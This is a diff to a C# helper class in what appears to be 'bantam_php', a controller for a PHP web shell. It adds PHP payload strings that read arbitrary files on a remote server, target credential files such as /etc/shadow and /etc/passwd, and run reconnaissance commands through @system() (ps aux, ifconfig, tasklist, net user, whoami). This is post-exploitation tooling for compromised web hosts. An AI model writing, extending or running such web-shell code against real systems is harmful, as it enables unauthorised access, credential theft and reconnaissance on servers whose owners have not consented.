@@ -7,7 +7,7 @@ using System.Threading.Tasks;
 
 namespace bantam_php
 {
-    class PHP_Helper
+    class PHP
     {
         /// <summary>
         /// 
@@ -56,7 +56,7 @@ namespace bantam_php
         /// </summary>
         public static string initDataVars = @"
             $os = 'nix';
-            if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){  $os = 'win'; }
+            if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $os = 'win'; }
 
             $cwd = @dirname(__FILE__);
             $freeSpace  = @diskfreespace($cwd);
@@ -96,6 +96,40 @@ namespace bantam_php
              + "'.$group.'" + colSeperator
             + "'.$phpVersion;";
 
+        public static string readFileProcedure(string fileName)
+        {
+            return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
+        }
+
+        public static string phpInfo = "phpinfo();";
+
+        public static string phpTestExecutionWithEcho = "echo '1';";
+
+        public static string linuxFS_ShadowFile         = "/etc/shadow";
+        public static string linuxFS_PasswdFile         = "/etc/passwd";
+        public static string linuxFS_IssueFile          = "/etc/issue.net";
+        public static string linuxFS_hostTargetsFile    = "/etc/hosts";
+        public static string linuxFS_ProcVersion        = "/proc/version";
+        public static string linuxFS_NetworkInterfaces  = "/etc/network/interfaces";
+
+        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+
+        public static string linuxOS_PsAux = "@system('ps aux');";
+
+        public static string linuxOS_Ifconfig = "@system('ifconfig');";
+
+        public static string windowsOS_Ipconfig = "@system('ipconfig');";
+
+        public static string windowsOS_TaskList = "@system('tasklist');";
+
+        public static string windowsOS_NetUser = "@system('net user');";
+
+        public static string windowsOS_NetAccounts = "@system('net accounts');";
+
+        public static string windowsOS_Ver = "@system('ver');";
+
+        public static string posixOS_Whoami = "@system('whoami');";
+
         /// <summary>
         /// 
         /// </summary>
@@ -121,11 +155,7 @@ namespace bantam_php
         /// <summary>
         /// 
         /// </summary>
-        public static string phpGetDrivesCode = @"foreach (range('a', 'z') as $drive) {
-				                            if (is_dir($drive . ':\\')) {
-					                            echo $drive.':|';
-				                            }
-                                        }";
+        public static string getHardDriveLetters = "foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { echo $drive.':|'; }}";
 
         /// <summary>
         /// 
@@ -185,6 +215,7 @@ namespace bantam_php
                     } ";
                 }
             }
+
             return @"$dirs = $files = array();
 	             function PermsColor($f) {
 		            if (!@is_readable($f)) {
@@ -242,6 +273,11 @@ namespace bantam_php
                         + "'.$dir['perms'].'" + rowSeperator + @"';
                     }
                 }catch(Exception $e){  }";
+        }
+
+        public static string getTaskListFunction(bool windowsOS = true)
+        {
+            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
         }
     }
 }
